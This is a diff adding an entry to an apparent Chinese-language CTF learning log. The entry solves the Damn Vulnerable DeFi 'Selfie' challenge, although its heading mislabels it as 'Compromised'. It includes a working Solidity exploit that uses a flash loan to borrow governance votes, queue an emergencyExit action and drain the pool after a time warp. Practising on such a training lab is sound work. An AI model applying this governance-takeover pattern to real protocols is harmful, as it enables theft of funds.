@@ -1397,5 +1397,69 @@ function test_theRewarder() public checkSolvedByPlayer {
 - 那這樣好像只能手動用 Foundry 作弊，快轉區塊時間 2 天了呢
 - 明天補上 Exploit Code
 
+### 2024.09.20
+
+#### [DamnVulnerableDeFi-07] Compromised
+
+- 通關條件: 把 `SelfiePool` 合約的 token 餘額偷走，轉到 recovery 帳號去
+- 解法:
+  - 昨天的分析是正確的，可以參考 09.19 的解題分析內容。
+  - 我們需要做的是: 發起一個 `SelfiePool.flashLoan()`
+  - 把 `SelfiePool` 合約的 voting token 借出來
+    - 呼叫 `token.delegate(address(this))` 使攻擊合約有足夠的 vote 可以通過 `SimpleGovernance._hasEnoughVotes()` 的檢查
+    - 向 `SimpleGovernance` 發起一個 `queueAction()` 請求
+    - `queueAction(bytes calldata data)` 裡面帶入的參數是 `SelfiePool.emergencyExit(recovery)`
+    - 閃電貸還款
+  - 然後等待 2 天，使 queue 進去的 Action 足夠成熟 (可以用 Foundry 作弊碼快轉區塊時間)
+  - 然後呼叫 `SimpleGovernance.executeAction()` 來把 `SelfiePool` 的 voting token 全部拿出來
+
+```solidity
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
+
+    function test_selfie() public checkSolvedByPlayer {
+        Hack hack = new Hack(token, governance, pool, recovery);
+        
+        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
+        pool.flashLoan(hack, address(token), TOKENS_IN_POOL, data);
+
+        vm.warp(2 days + 1);
+
+        governance.executeAction(1);
+    }
+
+
+contract Hack is IERC3156FlashBorrower {
+    DamnValuableVotes _token;
+    SimpleGovernance governance;
+    SelfiePool pool;
+    address recovery;
+
+    constructor(DamnValuableVotes token, SimpleGovernance _governance, SelfiePool _pool, address _recovery) {
+        _token = token;
+        governance = _governance;
+        pool = _pool;
+        recovery = _recovery;
+    }
+
+    function onFlashLoan(
+        address initiator,
+        address token,
+        uint256 amount,
+        uint256 fee,
+        bytes calldata data
+    ) external override returns (bytes32) {
+        _token.delegate(address(this));
+        governance.queueAction(address(pool), 0, data);
+
+        IERC20(token).approve(msg.sender, type(uint256).max);
+        
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+}
+```
+
+- [DamnVulnerableDeFi-06-Selfie.t.sol](/Writeup/DeletedAccount/DamnVulnerableDeFi-06-Selfie.t.sol)
+
 
 <!-- Content_END -->
